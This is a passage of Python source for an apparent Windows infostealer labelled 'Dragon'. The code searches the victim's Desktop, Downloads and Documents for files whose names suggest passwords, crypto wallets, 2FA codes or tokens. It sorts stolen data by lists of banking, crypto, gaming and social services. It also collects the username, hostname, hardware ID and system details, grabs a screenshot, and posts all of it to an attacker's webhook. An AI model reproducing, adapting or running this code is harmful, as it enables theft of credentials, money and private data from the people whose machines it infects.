                    target = path + "/" + file
                    KiwiFolder(target, keywords)
                    break

    KiwiFiles.append(["folder", path, fifound])


def Kiwi():
    user = temp.split("\AppData")[0]
    path2search = [
        user + "\\Desktop", user + "\\Downloads", user + "\\Documents"
    ]

    key_wordsFolder = ["account", "acount", "passw", "secret"]

    key_wordsFiles = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "account",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "secret",
    ]

    wikith = []
    for patt in path2search:
        kiwi = threading.Thread(target=KiwiFile, args=[patt, key_wordsFiles])
        kiwi.start()
        wikith.append(kiwi)
    return wikith


global keyword, cookiWords, paswWords, CookiCount, PasswCount, WalletsZip, GamingZip, OtherZip

keyword = [
    "mail",
    "[coinbase](https://coinbase.com)",
    "[sellix](https://sellix.io)",
    "[gmail](https://gmail.com)",
    "[steam](https://steam.com)",
    "[discord](https://discord.com)",
    "[riotgames](https://riotgames.com)",
    "[youtube](https://youtube.com)",
    "[instagram](https://instagram.com)",
    "[tiktok](https://tiktok.com)",
    "[twitter](https://twitter.com)",
    "[facebook](https://facebook.com)",
    "card",
    "[epicgames](https://epicgames.com)",
    "[spotify](https://spotify.com)",
    "[yahoo](https://yahoo.com)",
    "[roblox](https://roblox.com)",
    "[twitch](https://twitch.com)",
    "[minecraft](https://minecraft.net)",
    "bank",
    "[paypal](https://paypal.com)",
    "[origin](https://origin.com)",
    "[amazon](https://amazon.com)",
    "[ebay](https://ebay.com)",
    "[aliexpress](https://aliexpress.com)",
    "[playstation](https://playstation.com)",
    "[hbo](https://hbo.com)",
    "[xbox](https://xbox.com)",
    "buy",
    "sell",
    "[binance](https://binance.com)",
    "[hotmail](https://hotmail.com)",
    "[outlook](https://outlook.com)",
    "[crunchyroll](https://crunchyroll.com)",
    "[telegram](https://telegram.com)",
    "[pornhub](https://pornhub.com)",
    "[disney](https://disney.com)",
    "[expressvpn](https://expressvpn.com)",
    "crypto",
    "[uber](https://uber.com)",
    "[netflix](https://netflix.com)",
]

CookiCount, PasswCount = 0, 0
cookiWords = []
paswWords = []

WalletsZip = []  # [Name, Link]
GamingZip = []
OtherZip = []

GatherAll()
#RobloxCookie()
Injection(hook)
DETECTED = Trust(Cookies)
# DETECTED = False
if not DETECTED:
    wikith = Kiwi()

    for thread in wikith:
        thread.join()

    time.sleep(0.2)

    filetext = "\n"
    for arg in KiwiFiles:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f":file_folder: {foldpath}\n"

            for ffil in foldlist:
                a = ffil[0].split("/")
                fileanme = a[1]
                b = ffil[1]
                filetext += f"└─:open_file_folder: [{fileanme}]({b})\n"
            filetext += "\n"
    upload("kiwi", filetext)

username = getpass.getuser()

hostname = socket.gethostname()

hwid = (str(subprocess.check_output("wmic csproduct get uuid"),
            "utf-8").split("\n")[1].strip())

name = (str(subprocess.check_output("wmic csproduct get name"),
            "utf-8").split("\n")[1].strip())

embed = {
    "title":
    "Dragon  -  Extras",
    "description":
    "Extra Information.",
    "color":
    color,
    "fields": [
        {
            "name": "User",
            "value": f"```Host Name: {hostname}\n\nUsername: {username}```",
            "inline": True,
        },
        {
            "name": "System",
            "value":
            f"```OS: {platform.platform()}\n\nProcessor: {platform.processor()}\n\nHWID: {hwid}```",
            "inline": True,
        },
    ],
}

requests.post(hook, json={"embeds": [embed]})

screenshot = ImageGrab.grab()
screenshot.save("screenshot.png")
files = {"screenshot": open("screenshot.png", "rb")}
requests.post(hook, files=files)
files["screenshot"].close()
os.remove("screenshot.png")